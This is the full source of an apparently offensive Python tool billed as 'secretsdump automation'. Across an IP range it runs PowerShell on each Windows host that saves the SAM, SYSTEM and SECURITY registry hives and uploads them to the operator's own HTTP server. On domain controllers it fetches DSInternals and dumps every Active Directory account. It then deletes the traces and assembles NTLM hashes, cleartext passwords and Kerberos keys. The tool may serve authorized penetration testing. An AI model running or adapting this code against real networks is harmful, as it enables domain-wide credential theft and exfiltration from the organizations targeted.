#!/usr/bin/env python3
import os
import threading
import subprocess
import argparse
import socket
import string
import zipfile
from http.server import SimpleHTTPRequestHandler, HTTPServer
from concurrent.futures import ThreadPoolExecutor, as_completed

DSINTERNALS_URL = "https://github.com/MichaelGrafnetter/DSInternals/releases/download/v6.2/DSInternals_v6.2.zip"
DSINTERNALS_ZIP = "DSInternals_v6.2.zip"
EXEC_SCRIPT = "exec_across_windows.py"
UPLOAD_DIR = "./secretsdump_ng_out/"


def parse_ip_range(ip_range):
    """Parse IP range like 10.0.1-5.1-254 into list of IPs"""
    parts = ip_range.split('.')
    if len(parts) != 4:
        raise SystemExit("Invalid IP range format")

    def expand(part):
        vals = []
        for section in part.split(','):
            if '-' in section:
                s, e = map(int, section.split('-'))
                vals.extend(range(s, e + 1))
            else:
                vals.append(int(section))
        return vals

    expanded = [expand(p) for p in parts]
    return [
        f"{a}.{b}.{c}.{d}"
        for a in expanded[0]
        for b in expanded[1]
        for c in expanded[2]
        for d in expanded[3]
    ]


def get_host_ip_given_target(target_ip):
    """Get the local IP address used to reach a target IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target_ip, 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return None


def parse_ds_file(filepath):
    """Parse DSInternals dump file and extract credentials"""
    try:
        with open(filepath, 'r', encoding='utf-16-le', errors='ignore') as f:
            content = f.read()
    except:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    
    entries = []
    current_entry = {}
    in_kerberos_new = False
    current_key_type = None
    
    for line in content.split('\n'):
        line = line.strip()
        
        if not line:
            continue
        
        if line.startswith('DistinguishedName:'):
            if current_entry:
                entries.append(current_entry)
            current_entry = {}
            in_kerberos_new = False
            current_key_type = None
        
        elif line.startswith('SamAccountName:'):
            current_entry['sam'] = line.split(':', 1)[1].strip()
        
        elif line.startswith('Sid:'):
            sid = line.split(':', 1)[1].strip()
            current_entry['rid'] = sid.split('-')[-1]
        
        elif line.startswith('NTHash:'):
            nt_hash = line.split(':', 1)[1].strip()
            if nt_hash:
                current_entry['nt'] = nt_hash
        
        elif line.startswith('LMHash:'):
            lm_hash = line.split(':', 1)[1].strip()
            if lm_hash:
                current_entry['lm'] = lm_hash
        
        elif line.startswith('ClearText:'):
            cleartext = line.split(':', 1)[1].strip()
            if cleartext and all(ord(c) < 128 and c in string.printable for c in cleartext):
                current_entry['cleartext'] = cleartext
        
        elif line == 'KerberosNew:':
            in_kerberos_new = True
            if 'kerberos' not in current_entry:
                current_entry['kerberos'] = {}
        
        elif in_kerberos_new:
            if line == 'AES256_CTS_HMAC_SHA1_96':
                current_key_type = 'aes256'
            elif line == 'AES128_CTS_HMAC_SHA1_96':
                current_key_type = 'aes128'
            elif line == 'DES_CBC_MD5':
                current_key_type = 'des'
            elif line.startswith('Key:') and current_key_type:
                key = line.split(':', 1)[1].strip()
                if key:
                    current_entry['kerberos'][current_key_type] = key
            elif line in ['OldCredentials:', 'OlderCredentials:', 'ServiceCredentials:']:
                in_kerberos_new = False
    
    if current_entry:
        entries.append(current_entry)
    
    return entries


def format_ntds_output(entries):
    """Format NTDS entries in secretsdump style"""
    lines = []
    cleartext_lines = []
    kerberos_lines = []
    
    for entry in entries:
        sam = entry.get('sam', '')
        rid = entry.get('rid', '')
        
        if not sam or not rid:
            continue
        
        nt = entry.get('nt', '')
        lm = entry.get('lm', '')
        
        if nt or lm:
            lm_display = lm if lm else ''
            nt_display = nt if nt else ''
            if lm_display or nt_display:
                lines.append(f"{sam}:{rid}:{lm_display}:{nt_display}:::")
        
        if 'cleartext' in entry:
            cleartext_lines.append(f"{sam}:CLEARTEXT:{entry['cleartext']}")
        
        if 'kerberos' in entry and entry['kerberos']:
            kerb = entry['kerberos']
            kerb_parts = [sam]
            if 'aes256' in kerb:
                kerb_parts.append(f"aes256-cts-hmac-sha1-96:{kerb['aes256']}")
            if 'aes128' in kerb:
                kerb_parts.append(f"aes128-cts-hmac-sha1-96:{kerb['aes128']}")
            if 'des' in kerb:
                kerb_parts.append(f"des-cbc-md5:{kerb['des']}")
            if len(kerb_parts) > 1:
                kerberos_lines.append(':'.join(kerb_parts))
    
    output = []
    if lines:
        output.append("[*] Dumping NTDS.DIT secrets")
        output.extend(lines)
    
    if cleartext_lines:
        output.append("")
        output.append("[*] ClearText passwords grabbed")
        output.extend(cleartext_lines)
    
    if kerberos_lines:
        output.append("")
        output.append("[*] Kerberos keys grabbed")
        output.extend(kerberos_lines)
    
    return '\n'.join(output) if output else ''


def process_registry_hives(zip_path, ip):
    """Extract registry hives and run impacket-secretsdump"""
    try:
        extract_dir = os.path.join(UPLOAD_DIR, ip)
        os.makedirs(extract_dir, exist_ok=True)
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        
        sam_path = os.path.join(extract_dir, 'SAM')
        system_path = os.path.join(extract_dir, 'SYSTEM')
        security_path = os.path.join(extract_dir, 'SECURITY')
        
        cmd = [
            'secretsdump.py',
            '-sam', sam_path,
            '-system', system_path,
            '-security', security_path,
            'LOCAL'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        os.remove(zip_path)
        
        print(f"\033[32m[+]\033[0m Registry hives received from {ip}")
        
        return result.stdout
        
    except Exception as e:
        print(f"[!] Error processing registry hives for {ip}: {e}")
        return ''


def finalize_output(ip):
    """Combine NTDS dump (if exists) with secretsdump output"""
    extract_dir = os.path.join(UPLOAD_DIR, ip)
    ntds_file = os.path.join(extract_dir, f'ntds_{ip}.out')
    final_output = os.path.join(extract_dir, f'secretsdump.out')
    
    output_parts = []
    
    # Check for NTDS dump
    if os.path.exists(ntds_file):
        entries = parse_ds_file(ntds_file)
        ntds_output = format_ntds_output(entries)
        if ntds_output:
            output_parts.append(ntds_output)
        os.remove(ntds_file)
        print(f"\033[32m[+]\033[0m NTDS dump received from {ip}")
    
    # Check for secretsdump output
    hives_output_file = os.path.join(extract_dir, 'secretsdump_output.txt')
    if os.path.exists(hives_output_file):
        with open(hives_output_file, 'r') as f:
            hives_output = f.read().strip()
            if hives_output:
                if output_parts:
                    output_parts.append('')
                output_parts.append(hives_output)
        os.remove(hives_output_file)
    
    # Write final output
    if output_parts:
        final_content = '\n'.join(output_parts)
        with open(final_output, 'w') as f:
            f.write(final_content)
        print(f"\033[32m[+]\033[0m Credentials saved to: {final_output}")
        return final_content
    
    return None


class FileUploadHTTPRequestHandler(SimpleHTTPRequestHandler):
    """HTTP handler for receiving credential dumps"""
    
    def do_POST(self):
        os.makedirs(UPLOAD_DIR, exist_ok=True)
        
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(content_length)
            
            filename = self.headers.get('filename', 'upload.bin')
            filename = os.path.basename(filename)
            
            if filename.startswith('hives_'):
                ip = filename.replace('hives_', '').replace('.zip', '')
                extract_dir = os.path.join(UPLOAD_DIR, ip)
                os.makedirs(extract_dir, exist_ok=True)
                zip_path = os.path.join(extract_dir, filename)
                
                with open(zip_path, 'wb') as f:
                    f.write(data)
                
                hives_output = process_registry_hives(zip_path, ip)
                output_file = os.path.join(extract_dir, 'secretsdump_output.txt')
                with open(output_file, 'w') as f:
                    f.write(hives_output)
                
            elif filename.startswith('ntds_'):
                ip = filename.replace('ntds_', '').replace('.out', '')
                extract_dir = os.path.join(UPLOAD_DIR, ip)
                os.makedirs(extract_dir, exist_ok=True)
                out_path = os.path.join(extract_dir, filename)
                
                with open(out_path, 'wb') as f:
                    f.write(data)
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
            
        except Exception as e:
            print(f"[!] Upload error: {e}")
            self.send_response(500)
            self.end_headers()
    
    def log_message(self, format, *args):
        if hasattr(self.server, 'verbose') and self.server.verbose:
            super().log_message(format, *args)
        else:
            pass


def start_upload_server():
    """Start HTTP server for receiving credential uploads on port 1338"""
    class CustomHandler(FileUploadHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=UPLOAD_DIR, **kwargs)
    
    global http_server
    http_server = HTTPServer(("0.0.0.0", 1338), CustomHandler)
    http_server.serve_forever()


http_server = None


print_lock = threading.Lock()


def generate_command(ip, username, password, just_dc_user, verbose, show_output, show_single_output):
    """Generate and execute PowerShell command for target"""
    
    with print_lock:
        print(f"[*] Attempting to secretsdump on {ip} using credentials {username}:{password}")
    
    host_ip = get_host_ip_given_target(ip)

    ps_script = f'''
$isDC = $false
try {{
    $ntds = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS" -ErrorAction SilentlyContinue).ObjectName
    if ($ntds) {{ $isDC = $true }}
}} catch {{}}

reg save HKLM\\SAM C:\\ProgramData\\SAM /y | Out-Null
reg save HKLM\\SYSTEM C:\\ProgramData\\SYSTEM /y | Out-Null
reg save HKLM\\SECURITY C:\\ProgramData\\SECURITY /y | Out-Null

Compress-Archive -Path C:\\ProgramData\\SAM,C:\\ProgramData\\SYSTEM,C:\\ProgramData\\SECURITY -DestinationPath C:\\ProgramData\\hives_{ip}.zip -Force

iwr -Uri "http://{host_ip}:1338/upload" -Method Post -InFile "C:\\ProgramData\\hives_{ip}.zip" -Headers @{{"filename"="hives_{ip}.zip"}} -UseBasicParsing | Out-Null

del C:\\ProgramData\\SAM
del C:\\ProgramData\\SYSTEM
del C:\\ProgramData\\SECURITY
del C:\\ProgramData\\hives_{ip}.zip

if ($isDC) {{
    iwr http://{host_ip}:1338/{DSINTERNALS_ZIP} -o C:\\ProgramData\\DSInternals.zip
    Expand-Archive C:\\ProgramData\\DSInternals.zip -d C:\\ProgramData\\DSInternals\\
    Import-Module C:\\ProgramData\\DSInternals\\DSInternals\\DSInternals.psd1
'''

    if just_dc_user:
        ps_script += f'    Get-ADReplAccount -Server LOCALHOST -SamAccountName {just_dc_user} | Out-File C:\\ProgramData\\ntds_{ip}.out -Encoding Unicode\n'
    else:
        ps_script += f'    Get-ADReplAccount -All -Server LOCALHOST | Out-File C:\\ProgramData\\ntds_{ip}.out -Encoding Unicode\n'

    ps_script += f'''    iwr -Uri "http://{host_ip}:1338/upload" -Method Post -InFile "C:\\ProgramData\\ntds_{ip}.out" -Headers @{{"filename"="ntds_{ip}.out"}} -UseBasicParsing | Out-Null
    del C:\\ProgramData\\ntds_{ip}.out
    del C:\\ProgramData\\DSInternals.zip
    Remove-Item -Recurse -Force C:\\ProgramData\\DSInternals\\
}}
'''

    # the issue with trying to thread using exec_across_windows.py is that it becomes tricky to attribute secrets to an IP
    # this becomes even more of an issue if we are working through a jumpbox
    # thus we simply use it with --threads 1
    exec_cmd = [
        "python3", EXEC_SCRIPT,
        ip, username, password,
        ps_script,
        "--timeout", "30",
        "--threads", "1"
    ]
    
    if show_output:
        exec_cmd.append("-o")

    try:
        if verbose:
            subprocess.run(exec_cmd)
        else:
            subprocess.run(exec_cmd, capture_output=True, text=True)
        
        threading.Event().wait(1)
        
        final_content = finalize_output(ip)
        
        if final_content and show_single_output:
            with print_lock:
                print(f"\n{'='*60}")
                print(f"Results for {ip}:")
                print('='*60)
                print(final_content)
                print('='*60)
        
    except Exception as e:
        with print_lock:
            print(f"[!] Error on {ip}: {e}")


def main(args):
    """Main execution function"""
    dsinternals_path = os.path.join(UPLOAD_DIR, DSINTERNALS_ZIP)
    
    if not os.path.exists(dsinternals_path):
        print("[*] Downloading DSInternals...")
        try:
            subprocess.check_call(["wget", "-q", "-O", dsinternals_path, DSINTERNALS_URL])
        except subprocess.CalledProcessError:
            print("[!] Failed to download DSInternals")
            return

    if not os.path.exists(EXEC_SCRIPT):
        print(f"[!] {EXEC_SCRIPT} not found")
        return

    print("[*] Starting HTTP server on port 1338")
    threading.Thread(target=start_upload_server, daemon=True).start()

    targets = parse_ip_range(args.ip_range)
    show_single_output = len(targets) == 1
    
    print(f"[*] Targeting {len(targets)} host(s)")
    if args.just_dc_user:
        print(f"[*] Dumping only user: {args.just_dc_user}")
    print(f"[*] Output directory: {os.path.abspath(UPLOAD_DIR)}")
    print("-"*60)

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = [
            pool.submit(
                generate_command,
                ip,
                args.username,
                args.password,
                args.just_dc_user,
                args.verbose,
                args.show_output,
                show_single_output
            )
            for ip in targets
        ]
        for _ in as_completed(futures):
            pass

    print("\n[*] All tasks completed")
    
    if http_server:
        print("[*] Shutting down HTTP server...")
        http_server.shutdown()
    
    print("[*] Done!")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="secretsdump automation")
    os.makedirs(UPLOAD_DIR, exist_ok=True)

    parser.add_argument("ip_range", help="IP range (e.g. 10.0.1-5.1-254)")
    parser.add_argument("username", help="Domain username")
    parser.add_argument("password", help="Password")
    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="Concurrent threads (default: 10)")
    parser.add_argument("-just-dc-user", dest="just_dc_user", 
                        help="Extract only one user")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show exec_across_windows output")
    parser.add_argument("-o", "--show-output", action="store_true",
                        help="Show command output from target")

    args = parser.parse_args()
    main(args)